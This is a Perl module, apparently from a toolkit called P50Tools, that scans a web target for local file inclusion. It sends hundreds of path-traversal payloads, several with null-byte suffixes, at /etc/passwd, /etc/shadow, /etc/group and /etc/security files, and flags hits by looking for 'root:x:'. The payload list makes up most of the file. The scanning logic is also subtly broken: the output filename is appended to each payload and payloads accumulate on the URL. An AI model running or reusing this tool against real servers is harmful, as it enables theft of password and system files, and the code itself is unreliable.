package P50Tools::LFIScan;

use warnings;
use strict;
use lib 'Strings';
use Moose;
use HTTP::Request;
use LWP::UserAgent;

{
    no strict "vars";
    $VERSION = '0.1';
}

=head1 
For more information go to L<P50Tools>.
=cut

our @string ;
has 'target' => (is => 'rw', isa => 'Str');
has 'string_list' => (is => 'rw', 
					isa => 'Str', 
					default => 'nada');
has 'output' => (is => 'rw', 
				isa => 'Str', 
				default => 'output.txt');
sub scan{
	my $self = shift;
	my $s1 = $self->target;
	
	my $s3 = $self->output;
	
	$s1 .= "/" if ($s1 !~ m~(.+)/~gi);
	$s1 = "http://" . $s1 if ($s1 !~ /^http:/);
	unless ($self->string_list eq 'nada') { open IN, $self->string_list or die "Cannot open data: $!"; @string = <IN>;}
	if ($self->string_list eq 'nada') {@string = <DATA>;}
	open OUT,">>". $s3 or croak('Cannot create archive:\n' . $!);
	my $return = "Scan " . $s1;
	print "Start..\n";
	foreach (@string){
		print "String ", $_;
		$_ .= $s3;
		chomp $_;
		$s1 .= $_ ;
		my $req=HTTP::Request->new(GET=>$s1);
		my $ua=LWP::UserAgent->new();
		$ua->timeout(20);
		my $response = $ua->request($req);
		if ($response->is_success) {
			if( $response->content =~ /root:x:/){
			print OUT "$s1\n";
			print "\t--> $s1 is vulnerable..\n";
			}
			else {
				print "\t--> Not vunerable..\n";
			}
		}
		else {
			print "\t--> Not vunerable..\n";
		}
	}
	return $return;
}
no Moose;
1;
__DATA__
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../etc/passwd
../../../../../../../../../../../../../../../../etc/passwd
....//etc/passwd
....//....//etc/passwd
....//....//....//etc/passwd
....//....//....//....//etc/passwd
....//....//....//....//....//etc/passwd
....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//etc/passwd
....//....//....//....//....//....//....//....//....//....//etc/passwd
../../etc/passwd%00
../../../etc/passwd%00
../../../../etc/passwd%00
../../../../../etc/passwd%00
../../../../../../etc/passwd%00
../../../../../../../etc/passwd%00
../../../../../../../../etc/passwd%00
../../../../../../../../../etc/passwd%00
../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../../../etc/passwd%00
../../../../../../../../../../../../../../../../etc/passwd%00
....//etc/passwd%00
....//....//etc/passwd%00
....//....//....//etc/passwd%00
....//....//....//....//etc/passwd%00
....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//....//....//etc/passwd%00
....//....//....//....//....//....//....//....//....//....//etc/passwd%00
../etc/shadow
../../etc/shadow
../../../etc/shadow
../../../../etc/shadow
../../../../../etc/shadow
../../../../../../etc/shadow
../../../../../../../etc/shadow
../../../../../../../../etc/shadow
../../../../../../../../../etc/shadow
../../../../../../../../../../etc/shadow
../../../../../../../../../../../etc/shadow
../../../../../../../../../../../../etc/shadow
../../../../../../../../../../../../../etc/shadow
../../../../../../../../../../../../../../etc/shadow
../etc/shadow%00
../../etc/shadow%00
../../../etc/shadow%00
../../../../etc/shadow%00
../../../../../etc/shadow%00
../../../../../../etc/shadow%00
../../../../../../../etc/shadow%00
../../../../../../../../etc/shadow%00
../../../../../../../../../etc/shadow%00
../../../../../../../../../../etc/shadow%00
../../../../../../../../../../../etc/shadow%00
../../../../../../../../../../../../etc/shadow%00
../../../../../../../../../../../../../etc/shadow%00
../../../../../../../../../../../../../../etc/shadow%00
../etc/group
../../etc/group
../../../etc/group
../../../../etc/group
../../../../../etc/group
../../../../../../etc/group
../../../../../../../etc/group
../../../../../../../../etc/group
../../../../../../../../../etc/group
../../../../../../../../../../etc/group
../../../../../../../../../../../etc/group
../../../../../../../../../../../../etc/group
../../../../../../../../../../../../../etc/group
../../../../../../../../../../../../../../etc/group
../etc/group%00
../../etc/group%00
../../../etc/group%00
../../../../etc/group%00
../../../../../etc/group%00
../../../../../../etc/group%00
../../../../../../../etc/group%00
../../../../../../../../etc/group%00
../../../../../../../../../etc/group%00
../../../../../../../../../../etc/group%00
../../../../../../../../../../../etc/group%00
../../../../../../../../../../../../etc/group%00
../../../../../../../../../../../../../etc/group%00
../../../../../../../../../../../../../../etc/group%00
../etc/security/group
../../etc/security/group
../../../etc/security/group
../../../../etc/security/group
../../../../../etc/security/group
../../../../../../etc/security/group
../../../../../../../etc/security/group
../../../../../../../../etc/security/group
../../../../../../../../../etc/security/group
../../../../../../../../../../etc/security/group
../../../../../../../../../../../etc/security/group
../etc/security/group%00
../../etc/security/group%00
../../../etc/security/group%00
../../../../etc/security/group%00
../../../../../etc/security/group%00
../../../../../../etc/security/group%00
../../../../../../../etc/security/group%00
../../../../../../../../etc/security/group%00
../../../../../../../../../etc/security/group%00
../../../../../../../../../../etc/security/group%00
../../../../../../../../../../../etc/security/group%00
../etc/security/passwd
../../etc/security/passwd
../../../etc/security/passwd
../../../../etc/security/passwd
../../../../../etc/security/passwd
../../../../../../etc/security/passwd
../../../../../../../etc/security/passwd
../../../../../../../../etc/security/passwd
../../../../../../../../../etc/security/passwd
../../../../../../../../../../etc/security/passwd
../../../../../../../../../../../etc/security/passwd
../../../../../../../../../../../../etc/security/passwd
../../../../../../../../../../../../../etc/security/passwd
../../../../../../../../../../../../../../etc/security/passwd
../etc/security/passwd%00
../../etc/security/passwd%00
../../../etc/security/passwd%00
../../../../etc/security/passwd%00
../../../../../etc/security/passwd%00
../../../../../../etc/security/passwd%00
../../../../../../../etc/security/passwd%00
../../../../../../../../etc/security/passwd%00
../../../../../../../../../etc/security/passwd%00
../../../../../../../../../../etc/security/passwd%00
../../../../../../../../../../../etc/security/passwd%00
../../../../../../../../../../../../etc/security/passwd%00
../../../../../../../../../../../../../etc/security/passwd%00
../../../../../../../../../../../../../../etc/security/passwd%00
../etc/security/user
../../etc/security/user
../../../etc/security/user
../../../../etc/security/user
../../../../../etc/security/user
../../../../../../etc/security/user
../../../../../../../etc/security/user
../../../../../../../../etc/security/user
../../../../../../../../../etc/security/user
../../../../../../../../../../etc/security/user
../../../../../../../../../../../etc/security/user
../../../../../../../../../../../../etc/security/user
../../../../../../../../../../../../../etc/security/user
../etc/security/user%00
../../etc/security/user%00
../../../etc/security/user%00
../../../../etc/security/user%00
../../../../../etc/security/user%00
../../../../../../etc/security/user%00
../../../../../../../etc/security/user%00
../../../../../../../../etc/security/user%00
../../../../../../../../../etc/security/user%00
../../../../../../../../../../etc/security/user%00
../../../../../../../../../../../etc/security/user%00
../../../../../../../../../../../../etc/security/user%00
../../../../../../../../../../../../../etc/security/user%00
